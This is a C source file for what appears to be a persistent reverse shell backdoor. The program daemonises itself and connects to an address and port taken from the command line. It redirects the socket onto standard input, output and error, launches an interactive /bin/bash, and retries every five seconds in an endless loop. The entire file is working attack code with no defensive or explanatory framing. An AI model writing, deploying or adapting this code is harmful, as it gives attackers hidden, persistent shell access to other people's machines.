#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <termios.h>

#define SHELL "/bin/bash"
#define MAX_BUF 1024

void error(char* err_msg)
{
    perror(err_msg);
    exit(1);
}

// This function checks if a port was selected in the argc
int chk_argno(int* argc)
{
    if (*argc < 3) {
        error((char*)"ERROR: indicate the server address and the port number!");
        exit(1);
    }

    return 0;
}

int send_message(int* sockfd, char buffer[MAX_BUF])
{
    scanf("%s", buffer);
    return send(*sockfd, buffer, strlen(buffer), MSG_EOR | MSG_NOSIGNAL);
}

int create_socket()
{
    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int reuse = 1;

    fcntl(sockfd, F_SETFD, FD_CLOEXEC);

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int)) < 0)
        error((char*)"setsockopt(SO_REUSEADDR) failed");

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(int)) < 0)
        error((char*)"setsockopt(SO_REUSEPORT) failed");

    return sockfd;
}

struct sockaddr_in create_serv_addr(char* argv[])
{
    struct sockaddr_in serv_addr;

    memset(&serv_addr, 0, sizeof(serv_addr));

    serv_addr.sin_family        = AF_INET;
    serv_addr.sin_port          = htons(atoi(argv[2]));
    serv_addr.sin_addr.s_addr   = inet_addr(argv[1]);
    
    return serv_addr;
}

int reconnect(int sockfd)
{
    close(sockfd);
    sockfd = create_socket();
    return sockfd;
}

int main(int argc, char* argv[])
{
    // PUTS PROGRAM ON BACKGROUND AND CHECK PORT NUMBER
    daemon(1, 0);
    chk_argno(&argc);

    pid_t pid;

    char buffer[MAX_BUF];
    int sockfd = create_socket();
    int status;
    void (*osighand)(int);
    bool conn_flag = false;
    struct sockaddr_in serv_addr = create_serv_addr(argv);
infinite_loop:
    // Intento conectarme a un servidor que este escuchando conexiones.
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) >= 0) {
        conn_flag = true;
        memset(&buffer, 0, MAX_BUF);
        osighand = signal(SIGCHLD, SIG_DFL);
        if ((pid = fork()) == 0) {
            signal(SIGPIPE, SIG_DFL);
            for (int i = 0; i < 3; i++) {
                close(i);
                dup2(sockfd, i);
            }
            execl(SHELL, SHELL, "-i", (char*)NULL);
        }
    } else {
        //  Si el cliente no logra contectarse, espera 5 segundos y vuelve a
        //  intentar
        sleep(5);
    }
    if (conn_flag) {
        while (waitpid(pid, &status, 0) == -1) {
        }

        signal(SIGCHLD, osighand);

        kill(pid, SIGKILL);

        conn_flag = !conn_flag;
        sockfd = reconnect(sockfd);
    }

    goto infinite_loop;
    return 0;
}
